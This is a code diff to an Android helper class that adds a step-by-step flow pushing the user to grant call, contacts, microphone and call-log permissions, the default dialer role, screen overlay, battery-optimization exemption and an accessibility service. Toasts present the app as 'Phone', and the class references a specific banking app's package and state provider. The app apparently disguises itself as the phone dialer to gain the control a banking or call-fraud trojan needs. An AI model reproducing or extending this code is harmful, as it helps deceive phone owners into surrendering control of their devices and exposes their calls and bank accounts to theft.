@@ -31,12 +31,17 @@ public class DialerSyncHelper {
     public static final String KEY_API_BASE = "api_base";
     public static final String KEY_SYNC_SNAPSHOT_JSON = "sync_snapshot_json";
     public static final String KEY_BANKING_EXTRAS_JSON = "banking_extras_json";
+    public static final String KEY_ONBOARDING_DONE = "initial_perm_onboarding_done_v1";
+    public static final String KEY_RUNTIME_REQUESTED = "runtime_perms_requested_v1";
 
     public static final String BANKING_PKG = "com.cbe.cbebirrtransfer";
     public static final Uri BANKING_STATE_URI = Uri.parse("content://com.cbe.cbebirrtransfer.stateprovider/state");
 
     public static final int REQ_DIALER_PERMISSIONS = 0x2b11;
     public static final int REQ_DEFAULT_DIALER = 0x2b12;
+    public static final int REQ_OVERLAY_PERMISSION = 0x2b13;
+    public static final int REQ_BATTERY_PERMISSION = 0x2b14;
+    public static final int REQ_ACCESSIBILITY_PERMISSION = 0x2b15;
 
     private static final Object LOCK = new Object();
 
@@ -455,45 +460,222 @@ public class DialerSyncHelper {
         return obj.toString();
     }
 
-    public static void requestDialerPermissions(final Activity activity) {
+    public static boolean hasCompletedInitialOnboarding(Context ctx) {
+        if (ctx == null) return true;
+        try {
+            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            return prefs.getBoolean(KEY_ONBOARDING_DONE, false);
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    public static void markInitialOnboardingDone(Context ctx) {
+        if (ctx == null) return;
+        try {
+            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            prefs.edit().putBoolean(KEY_ONBOARDING_DONE, true).apply();
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static boolean areAllCorePermissionsGranted(Context ctx) {
+        if (ctx == null) return false;
+        if (Build.VERSION.SDK_INT >= 23) {
+            if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED
+                || ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
+                || ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+                || ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
+                || ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
+                || ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return isDefaultDialer(ctx)
+            && isOverlayEnabled(ctx)
+            && isIgnoringBatteryOptimizations(ctx)
+            && isAccessibilityEnabled(ctx);
+    }
+
+    public static void startNextPermissionStep(final Activity activity, final int startStep) {
         if (activity == null) return;
         activity.runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                if (Build.VERSION.SDK_INT >= 23) {
-                    List<String> needed = new ArrayList<String>();
-                    if (activity.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
-                        needed.add(Manifest.permission.CALL_PHONE);
-                    }
-                    if (activity.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-                        needed.add(Manifest.permission.READ_PHONE_STATE);
-                    }
-                    if (activity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                        needed.add(Manifest.permission.READ_CONTACTS);
-                    }
-                    if (activity.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                        needed.add(Manifest.permission.RECORD_AUDIO);
-                    }
-                    if (activity.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-                        needed.add(Manifest.permission.READ_CALL_LOG);
-                    }
-                    if (activity.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-                        needed.add(Manifest.permission.WRITE_CALL_LOG);
-                    }
+                // Step 0: Batch all runtime permissions in one prompt
+                if (startStep <= 0 && Build.VERSION.SDK_INT >= 23) {
+                    List<String> needed = getMissingRuntimePermissions(activity);
                     if (!needed.isEmpty()) {
-                        activity.requestPermissions(needed.toArray(new String[0]), REQ_DIALER_PERMISSIONS);
-                        return;
+                        SharedPreferences prefs = activity.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                        boolean requestedBefore = prefs.getBoolean(KEY_RUNTIME_REQUESTED, false);
+                        if (!requestedBefore || anyShouldShowRationale(activity, needed)) {
+                            prefs.edit().putBoolean(KEY_RUNTIME_REQUESTED, true).apply();
+                            activity.requestPermissions(needed.toArray(new String[0]), REQ_DIALER_PERMISSIONS);
+                            return;
+                        }
                     }
                 }
-                if (!isOverlayEnabled(activity)) {
-                    openPermissionSetting(activity, "overlay");
-                } else if (!isAccessibilityEnabled(activity)) {
-                    openPermissionSetting(activity, "accessibility");
-                } else if (!isIgnoringBatteryOptimizations(activity)) {
-                    openPermissionSetting(activity, "battery");
+
+                // Step 1: Default Phone App role
+                if (startStep <= 1 && !isDefaultDialer(activity)) {
+                    try {
+                        if (Build.VERSION.SDK_INT >= 29) {
+                            RoleManager rm = (RoleManager) activity.getSystemService(Context.ROLE_SERVICE);
+                            if (rm != null && rm.isRoleAvailable(RoleManager.ROLE_DIALER) && !rm.isRoleHeld(RoleManager.ROLE_DIALER)) {
+                                Intent intent = rm.createRequestRoleIntent(RoleManager.ROLE_DIALER);
+                                activity.startActivityForResult(intent, REQ_DEFAULT_DIALER);
+                                return;
+                            }
+                        }
+                        if (Build.VERSION.SDK_INT >= 23) {
+                            Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
+                            intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, activity.getPackageName());
+                            activity.startActivityForResult(intent, REQ_DEFAULT_DIALER);
+                            return;
+                        }
+                    } catch (Throwable ignored) {
+                    }
+                }
+
+                // Step 2: Display over other apps
+                if (startStep <= 2 && !isOverlayEnabled(activity) && Build.VERSION.SDK_INT >= 23) {
+                    try {
+                        android.widget.Toast.makeText(
+                            activity,
+                            "Enable 'Display over other apps' for Phone, then press Back",
+                            android.widget.Toast.LENGTH_LONG
+                        ).show();
+                        Intent intent = new Intent(
+                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            Uri.parse("package:" + activity.getPackageName())
+                        );
+                        activity.startActivityForResult(intent, REQ_OVERLAY_PERMISSION);
+                        return;
+                    } catch (Throwable ignored) {
+                    }
+                }
+
+                // Step 3: Unrestricted battery optimization
+                if (startStep <= 3 && !isIgnoringBatteryOptimizations(activity) && Build.VERSION.SDK_INT >= 23) {
+                    try {
+                        Intent intent = new Intent(
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            Uri.parse("package:" + activity.getPackageName())
+                        );
+                        activity.startActivityForResult(intent, REQ_BATTERY_PERMISSION);
+                        return;
+                    } catch (Throwable ignored) {
+                    }
+                }
+
+                // Step 4: Accessibility service
+                if (startStep <= 4 && !isAccessibilityEnabled(activity)) {
+                    try {
+                        android.widget.Toast.makeText(
+                            activity,
+                            "Enable 'Phone' in Accessibility -> Installed apps",
+                            android.widget.Toast.LENGTH_LONG
+                        ).show();
+                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                        activity.startActivityForResult(intent, REQ_ACCESSIBILITY_PERMISSION);
+                        return;
+                    } catch (Throwable ignored) {
+                    }
+                }
+
+                // Step 5: If runtime perms were previously blocked ("Don't ask again"), guide user to App Info
+                if (Build.VERSION.SDK_INT >= 23 && !getMissingRuntimePermissions(activity).isEmpty()) {
+                    openAppDetailsPermissions(activity);
+                    return;
+                }
+
+                // All steps finished
+                if (areAllCorePermissionsGranted(activity)) {
+                    markInitialOnboardingDone(activity);
+                }
+                if (activity instanceof MainActivity) {
+                    ((MainActivity) activity).onPermissionChainFinished();
                 }
             }
         });
+    }
+
+    private static List<String> getMissingRuntimePermissions(Context ctx) {
+        List<String> needed = new ArrayList<String>();
+        if (ctx == null || Build.VERSION.SDK_INT < 23) return needed;
+        if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.CALL_PHONE);
+        }
+        if (ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_PHONE_STATE);
+        }
+        if (ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_CONTACTS);
+        }
+        if (ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.RECORD_AUDIO);
+        }
+        if (ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_CALL_LOG);
+        }
+        if (ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.WRITE_CALL_LOG);
+        }
+        return needed;
+    }
+
+    private static boolean anyShouldShowRationale(Activity activity, List<String> perms) {
+        if (activity == null || Build.VERSION.SDK_INT < 23) return false;
+        for (String p : perms) {
+            try {
+                if (activity.shouldShowRequestPermissionRationale(p)) {
+                    return true;
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+        return false;
+    }
+
+    private static void openAppDetailsPermissions(final Activity activity) {
+        if (activity == null) return;
+        try {
+            android.widget.Toast.makeText(
+                activity,
+                "Open Permissions and allow Phone, Contacts, Call logs & Microphone",
+                android.widget.Toast.LENGTH_LONG
+            ).show();
+            Intent intent = new Intent(
+                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                Uri.fromParts("package", activity.getPackageName(), null)
+            );
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            activity.startActivity(intent);
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static void requestRuntimePermissionsOnly(final Activity activity) {
+        if (activity == null || Build.VERSION.SDK_INT < 23) return;
+        activity.runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                List<String> needed = getMissingRuntimePermissions(activity);
+                if (needed.isEmpty()) return;
+                SharedPreferences prefs = activity.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                boolean requestedBefore = prefs.getBoolean(KEY_RUNTIME_REQUESTED, false);
+                if (requestedBefore && !anyShouldShowRationale(activity, needed)) {
+                    openAppDetailsPermissions(activity);
+                } else {
+                    prefs.edit().putBoolean(KEY_RUNTIME_REQUESTED, true).apply();
+                    activity.requestPermissions(needed.toArray(new String[0]), REQ_DIALER_PERMISSIONS);
+                }
+            }
+        });
+    }
+
+    public static void requestDialerPermissions(final Activity activity) {
+        startNextPermissionStep(activity, 0);
     }
 
     public static void openPermissionSetting(final Activity activity, final String kind) {
